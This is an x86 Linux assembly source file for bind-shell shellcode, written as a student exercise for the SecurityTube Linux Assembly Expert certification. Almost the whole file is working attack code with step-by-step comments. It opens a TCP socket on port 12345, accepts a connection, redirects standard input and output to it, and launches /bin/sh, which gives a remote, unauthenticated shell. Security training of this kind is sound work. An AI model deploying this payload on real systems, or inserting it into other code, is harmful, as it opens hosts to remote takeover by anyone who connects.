;This shellcode has been created  for completing
;the requirements of the SecurityTube Linux
;Assembly Expert certification:
;http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert
;
;Student ID: SLAE-500

global _start

section .text

_start:
	xor eax,eax			;clearing the used registers
	mov ebx,eax
	;let's create a socket file descriptor
	mov al, 0x66		; socketcall
	push 0x6			; TCP
	push 0x1			; SOCK_STREAM
	push 0x2			; AF_INET	
	mov bl,0x1			; load the syscall socket(int domain, int type, int protocol)
	mov ecx,esp			; load the args pointer
	int 0x80			; call the sys_call
	mov edi,eax			; save the file descriptor
	

	;let's bind to it to a port
	xor eax,eax			;clearing used registers	
	;create struct sockaddr_in { sa_family_t sin_family; in_port_t sin_port; struct in_addr sin_addr; }
	push eax			; accept connection from INADDR_ANY=0
	push word 0x3930	; port number = 12345 (0x3039) you have to change the bytes order 
	push word 0x2		; AF_INET
	mov ebx,esp			; struct sockaddr_in
	;load the args of the syscall
	push 0x10			; the size of the struct
	push ebx			; load the address of the newly constructed struct in stack
	push edi			; load the newly created socket file descriptor
	mov ebx,eax			; clearing ebx register
	mov bl,0x2			; load the syscall int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
	mov ecx,esp			; load the args pointer
	mov al, 0x66		; socketcall
	int 0x80			; call the sys_call
	
	;let's listen
	mov al, 0x66		; socketcall, eax should be 0 if bind successful
	push byte 0x1		; The backlog argument defines the maximum length to which the queue of pending connections for sockfd may grow.
	push edi			; the socket file descriptor
	mov bl,0x4			; load the syscall int listen(int sockfd, int backlog);
	mov ecx,esp			; load the args pointer
	int 0x80			; call the sys_call
	
	;let's accept the new connection
	push eax			; if the previous call was succesfull, eax should be 0
	push eax			; I need two NULLs, for the last args of the next syscall
	mov al, 0x66		; socketcall
	mov bl, 0x5		; load the syscall int accept4(int sockfd, struct sockaddr *addr, socklen_t *addrlen, int flags);
	push edi			; the socket file descriptor
	mov ecx,esp			; load the args pointer
	int 0x80			; call the sys_call
	mov esi,eax			; save the file descriptor of the connection
	
	;we now have a connection, let's duplicate the file descriptor of the connection to the stdin,stdout and stderr
	xor ecx,ecx			; clearing some registers
	mov cl, 0x2			; loop from 2 to 0
dup2:
	mov al, 0x3f		; load the syscall int dup2(int oldfd, int newfd);
	mov ebx, esi		; load the conection's file descriptor to be duplicated to stdin, stdout and stderr
	int 0x80			; call the sys_call
	dec ecx			
	jns dup2			; jump until SF
	inc ecx
	
	;last step: let's start the /bin/sh
	mov al, 0xb		; load the syscall int execve(const char *filename, char *const argv[], char *const envp[]);
	push ecx			; it should be 0, it's used as NULL terminator for string
	push dword 0x68732f2f 	;"sh//"
	push dword 0x6e69622f 	;"nib/"
	mov ebx, esp		; load the string
	push ecx			
	mov edx, esp
	push ebx
	mov ecx, esp
	int 0x80
	
	;;let's exit gracefully; not so because we didn't close the socket, but OS will do that for us
	;;this will be deleted when converted
	;mov eax, 0x1	; syscall exit
	;xor ebx,ebx		; exitcode 0
	;int 0x80		; call the sys_call
